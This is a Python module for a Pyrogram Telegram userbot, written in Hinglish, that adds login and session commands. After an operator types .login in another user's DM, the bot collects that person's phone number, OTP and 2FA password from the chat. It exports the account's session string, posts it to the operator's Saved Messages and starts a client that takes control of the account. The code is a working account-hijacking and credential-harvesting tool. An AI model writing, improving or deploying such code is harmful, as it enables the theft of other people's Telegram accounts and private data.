"""
.login / .addsession / .cancellogin / .mylogin
OWNER + sudo. Session → Saved Messages + auto-start extra client.
"""
from typing import Any

from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.errors import (
    PhoneCodeInvalid, PhoneCodeExpired, PhoneNumberInvalid,
    PhoneNumberBanned, SessionPasswordNeeded, PasswordHashInvalid, FloodWait,
)

from core.clients import app
from config import API_ID, API_HASH, OWNER_ID
from modules.owner.sudoers import ub_cmd, SUDO_USERS

_LOGIN: dict[int, dict[str, Any]] = {}
_ARMED: set[int] = set()


def _is_op(uid: int | None) -> bool:
    if uid is None:
        return False
    if OWNER_ID and uid == OWNER_ID:
        return True
    return uid in SUDO_USERS


async def _send_to_saved(text: str):
    try:
        await app.send_message("me", text)
        return True
    except Exception as e:
        print(f"[login] Saved fail: {e}")
        return False


async def _cleanup_temp(state: dict):
    temp = state.get("temp_client")
    if temp:
        try:
            await temp.disconnect()
        except Exception:
            pass
        state["temp_client"] = None


async def _finish_session(sess: str, phone: str = ""):
    """Save to Saved Messages + start extra client."""
    from modules.owner.session_manager import start_extra_session

    ok, res = await start_extra_session(sess, notify_client=app)
    body = (
        f"<b>NEW SESSION</b>\n"
        f"{('Phone: <code>' + phone + '</code>\n') if phone else ''}"
        f"Result: {'ONLINE uid=' + str(res) if ok else res}\n\n"
        f"<code>{sess}</code>\n\n"
        f"Owner: <code>.sessions</code> <code>.sessioninfo {res if ok else 'id'}</code>"
    )
    await _send_to_saved(body)
    return ok, res


@app.on_message(ub_cmd("login") & filters.me)
async def login_cmd(client, message: Message):
    me = await client.get_me()
    op_id = message.from_user.id if message.from_user else me.id
    if not _is_op(op_id) and op_id != me.id:
        return

    if message.chat.type.name.lower() != "private":
        _ARMED.add(op_id)
        await message.reply_text(
            "<b>LOGIN ARMED</b>\n\n"
            "Jis user ke <b>DM</b> me <code>.login</code> likho.\n"
            "Phone → OTP → 2FA\n"
            "Session Saved Messages + us ID pe bot start.\n"
            "Cancel: <code>.cancellogin</code>"
        )
        return

    chat_id = message.chat.id
    if chat_id in _LOGIN:
        await _cleanup_temp(_LOGIN[chat_id])

    _LOGIN[chat_id] = {
        "step": "phone",
        "op_id": op_id,
        "phone": None,
        "phone_code_hash": None,
        "temp_client": None,
    }
    _ARMED.discard(op_id)
    await message.reply_text(
        "<b>LOGIN STARTED</b>\n\n"
        "1) Phone <code>+91XXXXXXXXXX</code>\n"
        "2) OTP\n"
        "3) 2FA password (agar ho)\n\n"
        "Session → Saved Messages\n"
        "Us ID pe alag bot control start hoga.\n"
        "Cancel: <code>.cancellogin</code>"
    )


@app.on_message(ub_cmd("cancellogin", "logoutlogin") & filters.me)
async def cancellogin_cmd(client, message: Message):
    op_id = message.from_user.id if message.from_user else 0
    _ARMED.discard(op_id)
    chat_id = message.chat.id
    if chat_id in _LOGIN:
        await _cleanup_temp(_LOGIN[chat_id])
        del _LOGIN[chat_id]
        await message.reply_text("Login cancel.")
    else:
        await message.reply_text("Koi active login nahi.")


@app.on_message(ub_cmd("addsession") & filters.me)
async def addsession_cmd(client, message: Message):
    parts = (message.text or "").split(None, 1)
    if len(parts) < 2:
        await message.reply_text("Usage: <code>.addsession SESSION_STRING</code>")
        return
    session = parts[1].strip()
    if len(session) < 20:
        await message.reply_text("Session bahut short.")
        return
    status = await message.reply_text("Session start…")
    ok, res = await _finish_session(session)
    if ok:
        await status.edit_text(
            f"✅ Online — uid <code>{res}</code>\n"
            f"Us account pe: <code>.ping</code>\n"
            f"Owner: <code>.sessioninfo {res}</code>"
        )
    else:
        await status.edit_text(f"❌ <code>{res}</code>")
    try:
        await message.delete()
    except Exception:
        pass


@app.on_message(ub_cmd("mylogin", "logins") & filters.me)
async def mylogin_cmd(client, message: Message):
    from modules.owner.session_manager import EXTRA

    await message.reply_text(
        f"<b>Login status</b>\n"
        f"Active flow: <code>{len(_LOGIN)}</code>\n"
        f"Armed: <code>{len(_ARMED)}</code>\n"
        f"Extra online: <code>{len(EXTRA)}</code>\n\n"
        f"<code>.login</code> <code>.addsession</code>\n"
        f"<code>.sessions</code> <code>.sessioninfo id</code>"
    )


@app.on_message(filters.private & filters.text, group=5)
async def login_steps(client, message: Message):
    chat_id = message.chat.id
    state = _LOGIN.get(chat_id)
    if not state:
        return
    text = (message.text or "").strip()
    if not text or text.startswith((".", "!")):
        return
    step = state.get("step")

    if step == "phone":
        phone = text.replace(" ", "").replace("-", "")
        if not phone.startswith("+") or not phone[1:].isdigit() or len(phone) < 10:
            await message.reply_text("Invalid. Example: <code>+919876543210</code>")
            return
        status = await message.reply_text("Code bhej rahe hain…")
        temp = Client(
            name=f"login_{chat_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=True,
        )
        try:
            await temp.connect()
            sent = await temp.send_code(phone)
            state["phone"] = phone
            state["phone_code_hash"] = sent.phone_code_hash
            state["temp_client"] = temp
            state["step"] = "code"
            await status.edit_text("OTP yahan bhejo.")
        except FloodWait as e:
            await _cleanup_temp({"temp_client": temp})
            await status.edit_text(f"FloodWait: {e.value}s")
            _LOGIN.pop(chat_id, None)
        except (PhoneNumberInvalid, PhoneNumberBanned):
            await _cleanup_temp({"temp_client": temp})
            await status.edit_text("Phone invalid/banned.")
        except Exception as e:
            await _cleanup_temp({"temp_client": temp})
            await status.edit_text(f"<code>{type(e).__name__}: {e}</code>")
            _LOGIN.pop(chat_id, None)
        return

    if step == "code":
        code = text.replace(" ", "").replace("-", "")
        if not code.isdigit():
            await message.reply_text("Sirf OTP digits.")
            return
        temp = state.get("temp_client")
        if not temp:
            await message.reply_text("Lost. <code>.login</code>")
            _LOGIN.pop(chat_id, None)
            return
        status = await message.reply_text("Sign in…")
        try:
            await temp.sign_in(
                phone_number=state["phone"],
                phone_code_hash=state["phone_code_hash"],
                phone_code=code,
            )
            sess = await temp.export_session_string()
            me = await temp.get_me()
            await temp.disconnect()
            state["temp_client"] = None
            _LOGIN.pop(chat_id, None)
            ok, res = await _finish_session(sess, state.get("phone") or "")
            await status.edit_text(
                f"✅ Login <b>{me.first_name}</b> <code>{me.id}</code>\n"
                f"Extra bot: {'ONLINE' if ok else res}\n"
                f"Us ID pe <code>.ping</code>\n"
                f"Owner: <code>.sessioninfo {me.id}</code>"
            )
        except SessionPasswordNeeded:
            state["step"] = "password"
            await status.edit_text("2FA — cloud password bhejo")
        except PhoneCodeInvalid:
            await status.edit_text("OTP galat.")
        except PhoneCodeExpired:
            await _cleanup_temp(state)
            _LOGIN.pop(chat_id, None)
            await status.edit_text("OTP expire. <code>.login</code>")
        except Exception as e:
            await _cleanup_temp(state)
            _LOGIN.pop(chat_id, None)
            await status.edit_text(f"<code>{type(e).__name__}: {e}</code>")
        return

    if step == "password":
        temp = state.get("temp_client")
        if not temp:
            await message.reply_text("Lost. <code>.login</code>")
            _LOGIN.pop(chat_id, None)
            return
        status = await message.reply_text("2FA…")
        try:
            await temp.check_password(text)
            sess = await temp.export_session_string()
            me = await temp.get_me()
            await temp.disconnect()
            state["temp_client"] = None
            _LOGIN.pop(chat_id, None)
            ok, res = await _finish_session(sess, state.get("phone") or "")
            await status.edit_text(
                f"✅ Login+2FA <b>{me.first_name}</b> <code>{me.id}</code>\n"
                f"Extra: {'ONLINE' if ok else res}\n"
                f"<code>.sessioninfo {me.id}</code>"
            )
        except PasswordHashInvalid:
            await status.edit_text("Password galat.")
        except Exception as e:
            await _cleanup_temp(state)
            _LOGIN.pop(chat_id, None)
            await status.edit_text(f"<code>{type(e).__name__}: {e}</code>")
